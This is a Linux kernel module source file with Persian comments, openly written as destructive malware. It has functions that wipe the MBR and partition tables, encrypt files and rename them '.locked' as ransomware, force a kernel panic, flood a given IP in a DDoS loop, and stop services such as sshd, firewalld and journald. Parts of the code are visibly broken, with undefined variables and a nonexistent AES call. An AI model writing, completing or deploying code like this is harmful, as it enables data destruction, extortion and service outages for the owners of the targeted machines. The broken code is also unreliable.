#include <linux/fs.h>
#include <linux/random.h>
#include <linux/cred.h>
#include "defines.h"

// تخریب سیستم فایل
void destroy_filesystem(void) {
    struct file *filp;
    loff_t pos = 0;
    char zero_buffer[4096] = {0};
    
    // تخریب MBR
    filp = filp_open("/dev/sda", O_WRONLY, 0);
    if (!IS_ERR(filp)) {
        kernel_write(filp, zero_buffer, sizeof(zero_buffer), &pos);
        filp_close(filp, NULL);
    }
    
    // تخریب جدول پارتیشن‌ها
    char *devices[] = {"/dev/sda1", "/dev/sda2", "/dev/nvme0n1p1", NULL};
    for (int i = 0; devices[i]; i++) {
        filp = filp_open(devices[i], O_WRONLY, 0);
        if (!IS_ERR(filp)) {
            kernel_write(filp, zero_buffer, sizeof(zero_buffer), &pos);
            filp_close(filp, NULL);
        }
    }
}

// رمزنگاری فایل‌ها (باج‌افزار)
void encrypt_files(const char *path, const char *ext) {
    struct file *filp;
    struct dentry *entry;
    struct path vfs_path;
    char data[4096];
    loff_t pos = 0;
    
    kern_path(path, LOOKUP_FOLLOW, &vfs_path);
    struct inode *inode = d_inode(vfs_path.dentry);
    
    if (S_ISDIR(inode->i_mode)) {
        struct dir_context ctx;
        // بازگشتی در دایرکتوری‌ها
        file->f_op->iterate_shared(file, &ctx);
    } else if (S_ISREG(inode->i_mode)) {
        // بررسی پسوند فایل
        if (strstr(entry->d_name.name, ext)) {
            filp = filp_open(entry->d_name.name, O_RDWR, 0);
            if (!IS_ERR(filp)) {
                size_t fsize = i_size_read(filp->f_inode);
                // خواندن فایل
                kernel_read(filp, data, sizeof(data), &pos);
                
                // رمزنگاری AES-256
                char iv[16];
                get_random_bytes(iv, sizeof(iv));
                aes_encrypt(data, sizeof(data), iv, data);
                
                // نوشتن داده‌های رمز شده
                pos = 0;
                kernel_write(filp, data, sizeof(data), &pos);
                filp_close(filp, NULL);
                
                // تغییر پسوند فایل
                char new_name[256];
                snprintf(new_name, sizeof(new_name), "%s.locked", entry->d_name.name);
                vfs_rename(entry->d_parent, entry, entry->d_parent, new_name);
            }
        }
    }
}

// تخریب سیستم (حالت هسته)
void kernel_panic_attack(void) {
    char *ptr = (char *)0x0;
    *ptr = 0xDEADBEEF;  // دسترسی به آدرس صفر - باعث panic میشود
}

// حمله DDoS لایه 4
void launch_ddos(const char *ip, int port) {
    struct socket *sock;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = in_aton(ip),
    };
    
    while (1) {
        sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
        sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
        // ارسال داده‌های تصادفی
        char buffer[1024];
        get_random_bytes(buffer, sizeof(buffer));
        kernel_sendmsg(sock, &msg, &vec, 1, sizeof(buffer));
        sock_release(sock);
    }
}

// غیرفعال‌سازی سرویس‌های حیاتی
void disable_critical_services(void) {
    char *services[] = {
        "systemd-journald", "sshd", "firewalld", 
        "avahi-daemon", "cron", "dbus", NULL
    };
    
    for (int i = 0; services[i]; i++) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "systemctl stop %s", services[i]);
        exec_command(cmd);
    }
}
